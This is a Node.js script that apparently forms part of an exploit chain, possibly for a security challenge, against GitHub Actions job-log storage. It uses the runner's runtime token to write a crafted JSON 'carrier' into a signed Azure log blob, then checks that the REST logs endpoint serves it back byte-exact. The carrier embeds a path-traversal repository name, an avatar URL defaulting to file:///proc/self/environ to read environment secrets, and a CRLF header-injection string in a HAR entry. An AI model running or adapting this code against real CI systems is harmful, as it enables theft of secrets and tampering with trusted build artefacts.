import {appendFileSync, mkdirSync, writeFileSync} from 'node:fs'
import {createHash} from 'node:crypto'
import {join} from 'node:path'

const RESULTS_GET_JOB_LOG_URL =
  'twirp/results.services.receiver.Receiver/GetJobLogsSignedBlobURL'
const RESULTS_CREATE_JOB_LOG_METADATA =
  'twirp/results.services.receiver.Receiver/CreateJobLogsMetadata'

function required(name) {
  const value = process.env[name]
  if (!value) throw new Error(`missing required environment variable ${name}`)
  return value
}

function decodeJwtPayload(token) {
  const parts = token.split('.')
  if (parts.length !== 3) throw new Error('ACTIONS_RUNTIME_TOKEN is not a JWT')
  try {
    return JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8'))
  } catch {
    throw new Error('ACTIONS_RUNTIME_TOKEN has an invalid JWT payload')
  }
}

function backendIds(token) {
  const payload = decodeJwtPayload(token)
  if (typeof payload.scp !== 'string') {
    throw new Error('ACTIONS_RUNTIME_TOKEN has no string scp claim')
  }
  const resultScope = payload.scp
    .split(' ')
    .find(scope => scope.startsWith('Actions.Results:'))
  const parts = resultScope?.split(':')
  if (!parts || parts.length !== 3 || !parts[1] || !parts[2]) {
    throw new Error('ACTIONS_RUNTIME_TOKEN has no usable Actions.Results scope')
  }
  return {workflowRunBackendId: parts[1], workflowJobRunBackendId: parts[2]}
}

async function checkedFetch(url, options, label) {
  let response
  try {
    response = await fetch(url, options)
  } catch (error) {
    // Never include a signed URL (and its sig query parameter) in an error.
    throw new Error(`${label} request failed: ${error?.name || 'network error'}`)
  }
  if (!response.ok) {
    const body = (await response.text())
      .replace(/([?&](?:sig|token)=)[^&\s<"']+/gi, '$1<redacted>')
      .slice(0, 500)
    throw new Error(`${label} returned HTTP ${response.status}: ${body}`)
  }
  return response
}

async function githubJobId(repository, runId, githubToken) {
  if (process.env.TARGET_JOB_ID) {
    if (!/^\d+$/.test(process.env.TARGET_JOB_ID)) {
      throw new Error('TARGET_JOB_ID must be decimal digits')
    }
    return process.env.TARGET_JOB_ID
  }

  const api = (process.env.GITHUB_API_URL || 'https://api.github.com').replace(/\/$/, '')
  const url = `${api}/repos/${repository}/actions/runs/${runId}/jobs?filter=latest&per_page=100`
  const response = await checkedFetch(url, {
    headers: {
      accept: 'application/vnd.github.v3+json',
      authorization: `Bearer ${githubToken}`,
      'x-github-api-version': '2022-11-28',
      'user-agent': 'actions-results-log-carrier',
    },
  }, 'list workflow jobs')
  const document = await response.json()
  const active = Array.isArray(document.jobs)
    ? document.jobs.filter(job => job?.status === 'in_progress' && Number.isSafeInteger(job?.id))
    : []
  if (active.length !== 1) {
    throw new Error(
      `expected exactly one in-progress job, found ${active.length}; set TARGET_JOB_ID explicitly`,
    )
  }
  return String(active[0].id)
}

function resultsEndpoint(resultsUrl, relativePath) {
  // ResultsServiceUrl can carry a deployment-specific path prefix. Resolve
  // beneath that prefix instead of reducing it to origin, as the artifact
  // toolkit does only for its own known github.com endpoint shape.
  const base = new URL(resultsUrl.endsWith('/') ? resultsUrl : `${resultsUrl}/`)
  return new URL(relativePath, base).toString()
}

function normalizedMediaType(value) {
  return typeof value === 'string'
    ? value.split(',', 1)[0].split(';', 1)[0].trim().toLowerCase()
    : ''
}

function boundedInteger(name, fallback, minimum, maximum) {
  const raw = process.env[name]
  if (raw === undefined || raw === '') return fallback
  if (!/^\d+$/.test(raw)) throw new Error(`${name} must be decimal digits`)
  const value = Number(raw)
  if (!Number.isSafeInteger(value) || value < minimum || value > maximum) {
    throw new Error(`${name} must be between ${minimum} and ${maximum}`)
  }
  return value
}

function delay(milliseconds) {
  return new Promise(resolve => setTimeout(resolve, milliseconds))
}

function isReplayable(probe) {
  return probe.ready === true &&
    probe.byteExact === true &&
    probe.contentDispositionPresent === false &&
    typeof probe.mediaType === 'string' &&
    probe.mediaType !== '' &&
    probe.mediaType !== 'application/json'
}

async function postResults(resultsUrl, runtimeToken, relativePath, body, label) {
  const response = await checkedFetch(resultsEndpoint(resultsUrl, relativePath), {
    method: 'POST',
    headers: {
      accept: 'application/json',
      authorization: `Bearer ${runtimeToken}`,
      'content-type': 'application/json',
      'user-agent': 'actions-results-log-carrier',
    },
    body: JSON.stringify(body),
  }, label)
  return response.json()
}

function appendQuery(url, suffix) {
  return `${url}${url.includes('?') ? '&' : '?'}${suffix}`
}

async function createSealedAppendBlob(logsUrl, body) {
  const parsed = new URL(logsUrl)
  if (parsed.protocol !== 'https:' && process.env.ALLOW_HTTP !== '1') {
    throw new Error('Results service returned a non-HTTPS log URL')
  }

  // Mirrors the official runner's non-SDK Azure path. Deliberately omit both
  // Content-Encoding and x-ms-blob-content-disposition: the trusted sample
  // must expose the raw JSON bytes and must not overwrite the HAR injection.
  await checkedFetch(logsUrl, {
    method: 'PUT',
    headers: {
      'content-type': 'text/plain',
      'x-ms-blob-type': 'AppendBlob',
    },
    body: Buffer.alloc(0),
  }, 'create append blob')

  await checkedFetch(appendQuery(logsUrl, 'comp=appendblock&seal=true'), {
    method: 'PUT',
    headers: {
      'x-ms-blob-sealed': 'true',
    },
    body,
  }, 'append and seal log blob')
}

function requirePrintableAscii(value, label) {
  if (!/^[\x20-\x7e]+$/.test(value)) {
    throw new Error(`${label} must contain printable ASCII only`)
  }
}

function makeCarrier(repository, avatarUrl) {
  requirePrintableAscii(repository, 'repository payload')
  requirePrintableAscii(avatarUrl, 'avatar URL')
  const json = Buffer.from(JSON.stringify({
    full_name: repository,
    owner: {login: 'archive', avatar_url: avatarUrl},
  }), 'utf8')
  const injected = Buffer.from(
    'attachment\r\nContent-Type: application/json\r\nX-Repo-Cassette: injected',
    'latin1',
  )
  const har = {
    log: {
      entries: [{
        response: {
          headers: [{
            name: 'Content-Disposition',
            value: {type: 'Buffer', data: [...injected]},
          }],
          content: {text: json.toString('utf8')},
        },
      }],
    },
  }
  return {body: json, har}
}

async function probeRestDownloadOnce(repository, jobId, githubToken, expectedBody) {
  const api = (process.env.GITHUB_API_URL || 'https://api.github.com').replace(/\/$/, '')
  const endpoint = `${api}/repos/${repository}/actions/jobs/${jobId}/logs`
  let initial
  try {
    initial = await fetch(endpoint, {
      redirect: 'manual',
      headers: {
        accept: 'application/vnd.github.v3+json',
        authorization: `Bearer ${githubToken}`,
        'x-github-api-version': '2022-11-28',
        'user-agent': 'actions-results-log-carrier',
      },
    })
  } catch (error) {
    return {ready: false, stage: 'initial', networkError: error?.name || 'network error'}
  }
  const location = initial.headers.get('location')
  if (initial.status < 300 || initial.status >= 400 || !location) {
    return {ready: false, initialStatus: initial.status}
  }

  let signed
  try {
    signed = new URL(location)
  } catch {
    return {ready: false, initialStatus: initial.status, invalidLocation: true}
  }
  const signedQueryKeys = [...new Set(signed.searchParams.keys())].sort()
  let final
  try {
    final = await fetch(location, {
      headers: {
        accept: 'application/vnd.github.v3+json',
        'user-agent': 'actions-results-log-carrier',
      },
    })
  } catch (error) {
    return {
      ready: false,
      initialStatus: initial.status,
      stage: 'final',
      networkError: error?.name || 'network error',
    }
  }
  if (!final.ok) {
    return {ready: false, initialStatus: initial.status, finalStatus: final.status}
  }
  let bytes
  try {
    bytes = Buffer.from(await final.arrayBuffer())
  } catch (error) {
    return {
      ready: false,
      initialStatus: initial.status,
      finalStatus: final.status,
      stage: 'body',
      bodyError: error?.name || 'body read error',
    }
  }
  const contentType = final.headers.get('content-type')
  return {
    ready: true,
    initialStatus: initial.status,
    finalStatus: final.status,
    redirectHost: signed.host,
    signedQueryKeys,
    hasRscd: signed.searchParams.has('rscd'),
    hasRsce: signed.searchParams.has('rsce'),
    hasRsct: signed.searchParams.has('rsct'),
    contentType,
    mediaType: normalizedMediaType(contentType),
    contentEncoding: final.headers.get('content-encoding'),
    contentDispositionPresent: final.headers.has('content-disposition'),
    byteLength: bytes.length,
    byteExact: bytes.equals(expectedBody),
    sha256: createHash('sha256').update(bytes).digest('hex'),
  }
}

function retryableProbe(result) {
  if (result.networkError) return true
  const status = result.finalStatus ?? result.initialStatus
  return new Set([404, 409, 425, 429, 500, 502, 503, 504]).has(status)
}

async function probeRestDownload(repository, jobId, githubToken, expectedBody) {
  const defaultAttempts = process.env.PROBE_ONLY === '1' ? 6 : 1
  const attempts = boundedInteger('PROBE_ATTEMPTS', defaultAttempts, 1, 20)
  const delayMs = boundedInteger('PROBE_DELAY_MS', 2000, 0, 30000)
  let result
  for (let attempt = 1; attempt <= attempts; attempt += 1) {
    result = await probeRestDownloadOnce(repository, jobId, githubToken, expectedBody)
    if (result.ready || !retryableProbe(result)) return {...result, attempts: attempt}
    if (attempt < attempts) await delay(delayMs)
  }
  return {...result, attempts}
}

function setOutput(name, value) {
  const output = process.env.GITHUB_OUTPUT
  if (output) appendFileSync(output, `${name}=${String(value)}\n`)
}

async function main() {
  const repository = required('GITHUB_REPOSITORY')
  const githubToken = required('GITHUB_TOKEN')
  if (process.env.PROBE_ONLY === '1') {
    const jobId = required('TARGET_JOB_ID')
    if (!/^\d+$/.test(jobId)) throw new Error('TARGET_JOB_ID must be decimal digits')
    const expected = Buffer.from(required('EXPECTED_BODY_BASE64'), 'base64')
    const probe = await probeRestDownload(repository, jobId, githubToken, expected)
    const outputDirectory = process.env.RUNNER_TEMP || process.cwd()
    mkdirSync(outputDirectory, {recursive: true})
    const manifestPath = join(outputDirectory, 'actions-results-log-probe.json')
    writeFileSync(manifestPath, `${JSON.stringify({jobId, probe}, null, 2)}\n`, {mode: 0o600})
    setOutput('job-id', jobId)
    setOutput('manifest', manifestPath)
    setOutput('probe-result', JSON.stringify(probe))
    if (process.env.REQUIRE_REPLAYABLE === '1' && !isReplayable(probe)) {
      throw new Error(`job-log carrier is not replayable: ${JSON.stringify(probe)}`)
    }
    return
  }

  const runId = required('GITHUB_RUN_ID')
  const runtimeToken = required('ACTIONS_RUNTIME_TOKEN')
  const resultsUrl = required('ACTIONS_RESULTS_URL')
  const ids = backendIds(runtimeToken)
  const jobId = await githubJobId(repository, runId, githubToken)
  const traversal = `x/../../repos/${repository}/actions/jobs/${jobId}/logs`
  if (traversal.length > 256) throw new Error('repository traversal exceeds challenge limit')

  const carrier = makeCarrier(
    traversal,
    process.env.AVATAR_URL || 'file:///proc/self/environ',
  )
  const requestIds = {
    workflow_run_backend_id: ids.workflowRunBackendId,
    workflow_job_run_backend_id: ids.workflowJobRunBackendId,
  }
  const signed = await postResults(
    resultsUrl,
    runtimeToken,
    RESULTS_GET_JOB_LOG_URL,
    requestIds,
    'get signed job-log URL',
  )
  const logsUrl = signed.logs_url || signed.logsUrl
  const storageType = signed.blob_storage_type || signed.blobStorageType
  if (typeof logsUrl !== 'string' || !logsUrl) {
    throw new Error('Results service response omitted logs_url')
  }
  if (storageType !== 'BLOB_STORAGE_TYPE_AZURE') {
    throw new Error(`unsupported Results blob storage type ${storageType}`)
  }

  await createSealedAppendBlob(logsUrl, carrier.body)
  const metadata = await postResults(
    resultsUrl,
    runtimeToken,
    RESULTS_CREATE_JOB_LOG_METADATA,
    {
      ...requestIds,
      uploaded_at: new Date().toISOString(),
      line_count: 1,
    },
    'create job-log metadata',
  )
  if (metadata?.ok !== true) throw new Error('Results metadata response did not contain ok=true')

  let probe = {ready: false, skipped: true}
  if (process.env.PROBE_REST === '1') {
    probe = await probeRestDownload(repository, jobId, githubToken, carrier.body)
  }

  const digest = createHash('sha256').update(carrier.body).digest('hex')
  const outputDirectory = process.env.RUNNER_TEMP || process.cwd()
  mkdirSync(outputDirectory, {recursive: true})
  const manifestPath = join(outputDirectory, 'actions-results-log-carrier.json')
  const manifest = {
    jobId,
    repository: traversal,
    bodyBase64: carrier.body.toString('base64'),
    bodySha256: digest,
    har: carrier.har,
    probe,
  }
  writeFileSync(manifestPath, `${JSON.stringify(manifest, null, 2)}\n`, {mode: 0o600})

  setOutput('job-id', jobId)
  setOutput('repository', traversal)
  setOutput('body-base64', manifest.bodyBase64)
  setOutput('body-sha256', digest)
  setOutput('manifest', manifestPath)
  setOutput('probe-result', JSON.stringify(probe))

  if (process.env.REQUIRE_REPLAYABLE === '1' && !isReplayable(probe)) {
    throw new Error(`job-log carrier is not replayable: ${JSON.stringify(probe)}`)
  }
}

await main()
